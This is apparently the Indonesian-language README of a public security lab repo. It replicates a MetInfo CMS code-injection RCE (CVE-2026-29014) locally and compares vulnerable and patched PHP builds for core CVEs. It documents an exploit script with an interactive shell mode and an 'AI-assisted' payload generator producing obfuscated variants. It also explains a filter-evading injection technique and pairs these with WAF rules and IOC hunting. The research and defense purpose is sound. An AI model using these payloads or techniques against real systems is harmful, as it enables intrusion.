# Lab RCE PHP 2026 — RCE yang viral, direplikasi & diuji secara lokal

> **Semua eksploitasi di repo ini hanya berjalan di `127.0.0.1`.**
> Lab memakai **replika** kode rentan yang ditulis ulang dari advisory publik —
> bukan instalasi CMS produksi yang ditembak. Tidak ada target pihak ketiga.

Lab ini menjawab satu pertanyaan: *"jaman AI harusnya bisa lebih mudah membuat
payload untuk melakukan penyerangan RCE"* — dengan **bukti yang bisa dijalankan
dan diverifikasi**, bukan klaim.

```
$ python3 verify/verify_lab.py
  [INFO] lab dinyalakan di :8098
  [PASS] lab server menyala -- HTTP 200
  [PASS] endpoint meniru perilaku MetInfo -- HTTP 200 body='success'
  [PASS] RCE (eksekusi perintah) -- VERIFY-42-1000
  [PASS] write primitive (cache/weixin/Array.php) -- 156 byte, berisi payload: True
  [PASS] 6 varian payload AI-assisted -- berhasil: 6/6
  [PASS] deteksi IOC artefak penyerang -- critical finding
  [PASS] diferensial PHP core (CVE-2026-109618) -- vulnerable=OOM:True patched=200:True

== 7/7 pemeriksaan lolos ==
```

> `verify_lab.py` bersifat **hermetik**: dia menyalakan instance lab sendiri di
> port `8098` (terpisah dari lab manual di `8099`), lalu mematikannya lagi di
> akhir. Jadi hasilnya tidak pernah tertukar dengan lab dari checkout lain.
> Server lab mengirim header `X-Lab-Root` supaya verifier bisa memastikan
> instance yang dipakai memang miliknya.

---

## 1. Apa yang ada di sini

| Direktori | Isi |
|---|---|
| `lab/` | Replika MetInfo rentan (CVE-2026-29014) + server `php -S` di 127.0.0.1:8099 |
| `exploit/` | `exploit.py` (RCE 2 tahap) + `payload_gen.py` (generator payload AI-assisted) |
| `core-cve/` | Diferensial PHP 8.4.11 (vulnerable) vs 8.4.27 (patched) untuk CVE-2026-109618/109619 |
| `defense/` | Rules WAF, hardening php.ini & Apache, skrip IOC hunting |
| `notes/` | Analisis root cause, peta CVE viral, peran AI, checklist remediasi (Bahasa Indonesia) |
| `verify/` | Skrip verifikasi end-to-end, hermetik (instance sendiri di `:8098`), bisa dipakai CI |

---

## 2. CVE yang dibahas

| CVE | Komponen | Severity | Status di lab |
|---|---|---|---|
| **CVE-2026-29014** | MetInfo CMS ≤ 8.1 — unauthenticated PHP code injection | 9.3 | **RCE penuh, terverifikasi** |
| **CVE-2026-109618** | PHP core — RCE via OOM corruption | 9.2 | **Diferensial terukur** (8.4.11 vs 8.4.27) |
| **CVE-2026-109619** | PHP core — RCE via stale global state | 9.2 | Mitigasi & jalur producer/consumer |
| CVE-2026-6722 / 7261 / 7262 | ext/soap — UAF | Critical | Ditinjau, tidak dieksploitasi penuh |
| CVE-2026-17544 | ext/bcmath — OOB write | High | Ditinjau |
| CVE-2024-4577 | PHP-CGI argument injection | 9.8 | **Tidak reproducible** (Windows only) |

---

## 3. Menjalankan

### 3.1 Prasyarat

* PHP CLI ≥ 8.3 (terpasang: 8.4.11)
* Python 3 + `requests`
* Apache 2.4 + mod_php (khusus untuk diferensial core CVE)

### 3.2 Lab MetInfo (CVE-2026-29014)

```bash
cd lab
setsid nohup python3 serve.py --port 8099 > /tmp/lab.log 2>&1 & disown
cd ..

# RCE satu perintah
python3 exploit/exploit.py -t http://127.0.0.1:8099 -c 'id'

# Shell interaktif
python3 exploit/exploit.py -t http://127.0.0.1:8099 --shell
```

Contoh output nyata:

```
$ python3 exploit/exploit.py -t http://127.0.0.1:8099 -c 'id; uname -a'
[+] tahap 1 (write cache/weixin/Array.php): HTTP 200 'success'
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),...
Linux kali 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC ...
```

### 3.3 Verifikasi otomatis

Tidak perlu menyalakan lab manual — verifier akan menyalakan instance sendiri:

```bash
python3 verify/verify_lab.py            # hermetik, instance sendiri di :8098
python3 verify/verify_lab.py --json     # output JSON untuk CI
python3 verify/verify_lab.py --skip-core
python3 verify/verify_lab.py --target http://127.0.0.1:8099   # pakai lab yang sudah jalan
```

Exit code `0` hanya bila semua pemeriksaan lolos. Checkout baru yang di-clone
dari repo ini langsung bisa diverifikasi tanpa langkah tambahan.

### 3.4 Generator payload AI-assisted

```bash
# Lihat semua varian
python3 exploit/payload_gen.py --list

# Cetak payload dalam berbagai bentuk
python3 exploit/payload_gen.py -c 'id' --variant eval_b64 --emit php
python3 exploit/payload_gen.py -c 'id' --variant complex_curly --emit curl

# Bangkitkan + uji semua varian terhadap lab
python3 exploit/payload_gen.py -c 'id' --validate
```

```
    [+] complex_curly  RCE OK -> uid=1000(kali) gid=1000(kali) ...
    [+] eval_b64       RCE OK -> uid=1000(kali) gid=1000(kali) ...
    [+] chr_chain      RCE OK -> uid=1000(kali) gid=1000(kali) ...
    [+] hex_escape     RCE OK -> uid=1000(kali) gid=1000(kali) ...
    [+] gzip_b64       RCE OK -> uid=1000(kali) gid=1000(kali) ...
    [+] raw            RCE OK -> uid=1000(kali) gid=1000(kali) ...

berhasil: 6/6
```

### 3.5 Diferensial PHP core (CVE-2026-109618)

Butuh `libphp8.4.so` versi 8.4.27 (patched). Modul ini **tidak disertakan** di
repo (binarya Debian). Siapkan sendiri di direktori mana pun:

```bash
mkdir -p ~/pkgs/modphp && cd ~/pkgs
curl -sO "http://security.debian.org/debian-security/pool/updates/main/p/php8.4/libapache2-mod-php8.4_8.4.27-1~deb13u1_amd64.deb"
dpkg-deb -x libapache2-mod-php8.4_8.4.27-1~deb13u1_amd64.deb modphp
```

Jalankan (path modul patched diberikan lewat environment variable `FIXED_MOD`):

```bash
cd core-cve
FIXED_MOD=~/pkgs/modphp/usr/lib/apache2/modules/libphp8.4.so ./apache_diff.sh start
#   :8091 = 8.4.11 (vulnerable)   :8092 = 8.4.27 (patched)
./run_diff.sh               # reproduksi semua pengukuran
./apache_diff.sh stop
```

> Tanpa `FIXED_MOD`, skrip memakai `/usr/lib/apache2/modules/libphp8.4.so`
> (versi bawaan sistem) untuk kedua sisi dan akan menolak jalan bila modul
> patched tidak ditemukan.

Hasil utama (detail di `core-cve/RESULTS.md`):

| header per part | wire | 8.4.11 | 8.4.27 |
|---:|---:|---:|---:|
| 100.000 | 0,38 MB | 31.549.960 B heap | 350.104 B |
| 200.000 | 0,76 MB | **HTTP 500 — OOM saat startup** | 350.104 B |

→ **≈79× amplifikasi memori** pada build vulnerable; build patched memakai
memori konstan.

### 3.6 Pertahanan

```bash
# Deteksi jejak penyerangan di log + filesystem
python3 defense/ioc_hunt.py --all /var/log/apache2
python3 defense/ioc_hunt.py --fs /var/www/html

# Uji aturan WAF (butuh mod_security2)
apachectl -t
```

---

## 4. Ringkasan temuannya

**CVE-2026-29014** — RCE MetInfo karena tiga primitive yang saling mengunci:

1. `cache::get()` melakukan `include` dengan path dari parameter penyerang →
   path traversal.
2. `cache::put()` menulis input penyerang mentah ke file `.php` (baris
   escaping-nya dikomentari di versi rentan).
3. Karena isinya berada di dalam `double-quoted string`, kode biasa tidak
   dieksekusi — yang bekerja adalah *complex (curly) syntax* `{${...}}`.
   Ditutup `.${die()}` agar sisa file tidak jadi syntax error.

Payload dikirim lewat header `C:` (base64), dengan `HTTP_C` ditulis sebagai
`chr(72).chr(84).chr(84).chr(80).chr(95).chr(67)` supaya lolos filter naif.

**CVE-2026-109618** — `longjmp()` untuk handling OOM meninggalkan state request
invalid; di mod_php prosedur shutdown tetap dipanggil → UAF → RCE. Patch
8.4.27 mengganti `longjmp()` dengan soft OOM di VM safe point + hard OOM via
`_exit()`.

**CVE-2026-109619** — state global milik request sebelumnya masih hidup saat
request berikutnya mulai; *producer* dan *consumer* harus ada, dan keduanya
harus ditangani worker yang sama.

---

## 5. Dokumentasi

| Dokumen | Isi |
|---|---|
| [`notes/00-peta-cve-viral.md`](notes/00-peta-cve-viral.md) | Peta CVE RCE PHP yang viral, tabel versi rentan/terpatch, mana yang bisa direproduksi |
| [`notes/01-analisis-cve-2026-29014.md`](notes/01-analisis-cve-2026-29014.md) | Root cause lengkap, alur exploit, kenapa AI expedited payload crafting |
| [`notes/02-payload-ai.md`](notes/02-payload-ai.md) | Peran AI dalam pembuatan payload + konsekuensi untuk pertahanan |
| [`notes/03-remediation.md`](notes/03-remediation.md) | Checklist remediasi berurutan prioritas |
| [`core-cve/RESULTS.md`](core-cve/RESULTS.md) | Data diferensial PHP 8.4.11 vs 8.4.27 |
| [`defense/README.md`](defense/README.md) | Cara memasang tiap artefak pertahanan |

---

## 6. Sumber

* CVE-2026-29014 — KIS-2026-06, <https://karmainsecurity.com/KIS-2026-06>
  (PoC: <https://karmainsecurity.com/pocs/CVE-2026-29014.php>)
* CVE-2026-109618 — GHSA-w8hw-w9fx-j79w,
  <https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w>
* CVE-2026-109619 — GHSA-6wmf-4rv5-p3rp,
  <https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp>
* PHP NEWS 8.4.27 — <https://github.com/php/php-src/blob/PHP-8.4.27/NEWS>

---

## 7. Batasan

* Lab MetInfo adalah **replika** yang ditulis ulang dari potongan kode pada
  advisory, bukan MetInfo asli (repository upstream butuh kredensial).
* CVE-2026-109618: yang didemonstrasikan adalah **premise** (OOM saat request
  startup + shutdown pada state invalid) serta **perbedaan perilaku** antara
  build vulnerable dan patched. Exploit RCE penuh membutuhkan heap shaping
  spesifik dan tidak dipublikasikan.
* CVE-2026-109619: exploit lengkap tidak dibuat; yang diuji adalah jalur
  producer/consumer yang dijelaskan advisory dan mitigasinya.
* CVE-2024-4577 tidak dapat direproduksi di Linux (hanya Windows).

---

## 8. Repositori & publikasi

Repo ini dipublikasikan sebagai **`kandasirah/php-rce-2026`** (public):

<https://github.com/kandasirah/php-rce-2026>

Repo sempat dibuat `private` saat push pertama, lalu dibuka ke publik atas
permintaan pemilik repo. Alasannya: exploit di sini memang **bisa jalan**
dan publikasi nyaris irreversible, tapi risikonya tercover karena:

* advisory + PoC publiknya sudah ada lebih dulu (KIS-2026-06, GHSA php-src),
  jadi exploit ini tidak menambah informasi baru bagi penyerang;
* targetnya **replika** yang ditulis ulang, bukan CMS asli, dan seluruh
  eksploitasi hanya di `127.0.0.1`;
* separuh isi repo adalah artefak pertahanan yang justru lebih berguna
  kalau luas dipakai;
* exploit penuh CVE-2026-109618/109619 memang **tidak** dibuat — yang ada
  hanya harness diferensial vulnerable-vs-patched.

### Kembalikan ke private

```bash
# via GitHub CLI
gh repo edit kandasirah/php-rce-2026 --visibility private

# atau via API (butuh scope 'repo' pada PAT)
curl -X PATCH https://api.github.com/repos/kandasirah/php-rce-2026 \
  -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" \
  -d '{"private":true}'
```

### Yang sudah disiapkan sebelum dipublikasikan

* [`LICENSE`](LICENSE) — MIT
* [`SECURITY.md`](SECURITY.md) — kebijakan disclosure + batasan penggunaan
* Pernyataan scope di header README: lab ini hanya untuk `127.0.0.1`, bukan
  untuk sistem pihak ketiga.

> **Penegakan lisensi & tanggung jawab:** MIT mengizinkan penggunaan ulang,
> tapi itu **bukan** izin memakai exploit ini terhadap sistem orang lain.
> Batasan penggunaan ada di [`SECURITY.md`](SECURITY.md). Penulis tidak
> bertanggung jawab atas penyalahgunakan repo ini di luar lab.

### Kredensial: pakai SSH, bukan PAT

Repo ini di-push lewat **SSH key** (`git@github.com:kandasirah/php-rce-2026.git`),
bukan personal access token. Alasannya:

* SSH key hanya bisa dipakai untuk **git**, tidak memberi akses API ke akun.
* PAT (terutama *classic* dengan scope `repo`) memberi akses ke **seluruh**
  repo dan API akun — kebocorannya jauh lebih mahal.
* Tidak ada token yang tersimpan di `.git/config` atau file mana pun di repo.

```bash
# 1. buat key (kalau belum ada)
ssh-keygen -t ed25519 -C "kandasirah@github/php-rce-2026" -f ~/.ssh/id_ed25519_github

# 2. daftarkan public key di GitHub -> Settings -> SSH and GPG keys
cat ~/.ssh/id_ed25519_github.pub

# 3. arahkan remote ke SSH
git remote set-url origin git@github.com:kandasirah/php-rce-2026.git

# 4. test
ssh -T git@github.com     # -> "Hi <user>! You've successfully authenticated"
git push
```

Kalau memang butuh token (mis. untuk GitHub Actions), pakai **fine-grained
PAT** dengan scope `Contents: Read and write` pada **satu repo saja** — bukan
`repo` global. Cara cepat membuatnya tanpa bingung dengan UI-nya:

```
https://github.com/settings/personal-access-tokens/new?name=php-rce-2026-push&target_name=kandasirah&expires_in=90&contents=write
```

Lalu set `Repository access` → `Only select repositories` → pilih
`php-rce-2026` → Generate.

> Di form fine-grained PAT, level `Read and write` **bukan** checkbox terpisah
> melainkan **dropdown di sebelah kanan** baris permission-nya (mis. baris
> "Contents"). Kalau se-section Repository permissions tidak muncul, berarti
> `Repository access` masih `Public repositories (read-only)` — ganti dulu ke
> `Only select repositories`. `Metadata: read` selalu granted otomatis.
